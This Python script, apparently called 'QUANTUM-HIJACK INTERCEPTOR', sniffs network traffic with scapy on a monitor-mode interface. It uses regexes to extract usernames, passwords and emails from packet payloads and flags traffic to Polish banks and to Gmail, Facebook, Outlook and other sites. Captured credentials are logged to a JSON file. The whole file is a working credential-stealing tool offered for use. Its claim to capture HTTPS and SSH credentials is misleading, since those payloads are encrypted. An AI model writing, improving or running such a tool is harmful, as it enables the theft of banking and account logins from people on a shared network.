#!/usr/bin/env python3
"""
QUANTUM-HIJACK INTERCEPTOR v3.0
Captura tráfico HTTPS/HTTP/FTP/SSH y credenciales en tiempo real
"""

import sys
import json
import re
import os
from datetime import datetime
from scapy.all import sniff, TCP, IP, Raw

OUTPUTFILE = "logs/captured_credentials.json"
CAPTURE_IFACE = sys.argv[1] if len(sys.argv) > 1 else os.getenv("MON_IFACE", "wlan0mon")

# Palabras clave para detectar credenciales
CREDENTIAL_PATTERNS = {
    'username': [r'username["\']?\s*[=:]?\s*["\']?([^"\'&\s]+)', r'user["\']?\s*[=:]?\s*["\']?([^"\'&\s]+)'],
    'password': [r'password["\']?\s*[=:]?\s*["\']?([^"\'&\s]+)', r'pass["\']?\s*[=:]?\s*["\']?([^"\'&\s]+)'],
    'email': [r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})'],
    'login': [r'login["\']?\s*[=:]?\s*["\']?([^"\'&\s]+)']
}

# Patrones de bancos y sitios populares
BANK_PATTERNS = {
    'PKO': [r'pkobp\.pl', r'ipko\.pl', r'pko\.bank'],
    'Santander': [r'santander.*\.pl', r'centrum24', r'santander\.online'],
    'mBank': [r'mbank\.pl', r'online\.mbank', r'transakcyjny\.mbank'],
    'ING': [r'ing\.pl', r'mojeing\.pl'],
    'Gmail': [r'accounts\.google\.com', r'gmail\.com', r'google\.login'],
    'Outlook': [r'outlook\.live\.com', r'login\.live\.com', r'outlook\.com'],
    'Facebook': [r'facebook\.com', r'fb\.com', r'm\.facebook'],
    'Instagram': [r'instagram\.com', r'ig\.me'],
    'WhatsApp': [r'web\.whatsapp\.com', r'whatsapp\.com'],
    'Twitter': [r'twitter\.com', r'x\.com'],
    'LinkedIn': [r'linkedin\.com', r'lnkd\.in'],
    'Allegro': [r'allegro\.pl', r'uzytkownik\.allegro']
}

captured_credentials = []

def detect_target_data(data_str):
    """Detecta banco o sitio específico en el tráfico"""
    data_lower = data_str.lower()
    for target_name, patterns in BANK_PATTERNS.items():
        for pattern in patterns:
            if re.search(pattern, data_lower, re.IGNORECASE):
                return target_name
    return None

def extract_credentials(data_str):
    """Extrae credenciales del payload"""
    results = {}
    for fieldname, patterns in CREDENTIAL_PATTERNS.items():
        for pattern in patterns:
            match = re.search(pattern, data_str, re.IGNORECASE)
            if match:
                results[fieldname] = match.group(1)
                break
    return results

def save_credentials():
    """Guarda credenciales a JSON"""
    try:
        os.makedirs('logs', exist_ok=True)
        with open(OUTPUTFILE, 'w') as f:
            json.dump(captured_credentials, f, indent=2)
    except:
        pass

def pkt_callback(pkt):
    """Callback para procesar cada paquete"""
    global captured_credentials
    
    if not pkt.haslayer(IP) or not pkt.haslayer(TCP):
        return
    
    src_ip = pkt[IP].src
    dst_ip = pkt[IP].dst
    dst_port = pkt[TCP].dport
    
    # Puertos monitoreados
    monitored_ports = [21, 22, 80, 443, 3306, 5432, 27017]
    if dst_port not in monitored_ports:
        return
    
    timestamp = datetime.now().strftime("%H:%M:%S")
    
    if pkt.haslayer(Raw):
        payload = bytes(pkt[Raw].load)
        try:
            data_str = payload.decode('utf-8', errors='ignore')
        except:
            data_str = str(payload)
    else:
        data_str = ""
    
    # Detectar protocolo por puerto
    if dst_port == 443:
        protocol = "HTTPS"
    elif dst_port == 80:
        protocol = "HTTP"
    elif dst_port == 21:
        protocol = "FTP"
    elif dst_port == 22:
        protocol = "SSH"
    elif dst_port == 3306:
        protocol = "MySQL"
    elif dst_port == 5432:
        protocol = "PostgreSQL"
    elif dst_port == 27017:
        protocol = "MongoDB"
    else:
        protocol = "UNKNOWN"
    
    # Buscar credenciales
    creds = extract_credentials(data_str)
    target = detect_target_data(data_str)
    
    if creds:
        entry = {
            'timestamp': timestamp,
            'protocol': protocol,
            'src_ip': src_ip,
            'dst_ip': dst_ip,
            'port': dst_port,
            'credentials': creds,
            'target': target if target else 'Desconocido'
        }
        captured_credentials.append(entry)
        
        # Alerta especial para bancos
        alert = f"[{timestamp}] [{protocol}] {src_ip} → {dst_ip}:{dst_port}"
        if target:
            alert += f" | 🔥 {target} DETECTADO"
        print(alert)
        
        if creds:
            print(f"  Credenciales: {creds}")
        
        save_credentials()
    
    elif target:
        print(f"[{timestamp}] [{protocol}] {target} visitado por {src_ip}")
    
    elif any(keyword in data_str.lower() for keyword in ['login', 'password', 'user', 'email', 'auth']):
        print(f"[{timestamp}] [{protocol}] {src_ip} → {dst_ip}:{dst_port} [SOSPECHOSO]")

def main():
    print("="*60)
    print("🔥 QUANTUM-HIJACK INTERCEPTOR v3.0")
    print("="*60)
    print(f"Escaneando tráfico en {CAPTURE_IFACE}...")
    print("Puertos monitoreados: 21(FTP), 22(SSH), 80(HTTP), 443(HTTPS), 3306(MySQL), 5432(PostgreSQL), 27017(MongoDB)")
    print(f"Output: {OUTPUTFILE}")
    print("="*60)
    
    try:
        # Crear directorio de logs
        os.makedirs('logs', exist_ok=True)
        
        sniff(
            iface=CAPTURE_IFACE,
            prn=pkt_callback,
            filter='tcp port 21 or tcp port 22 or tcp port 80 or tcp port 443 or tcp port 3306 or tcp port 5432 or tcp port 27017',
            store=False,
            verbose=0
        )
    except KeyboardInterrupt:
        print("\n[!] Interceptor detenido")
        save_credentials()
        print(f"[✓] {len(captured_credentials)} credenciales capturadas guardadas")
        sys.exit(0)
    except Exception as e:
        print(f"[ERROR] {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()
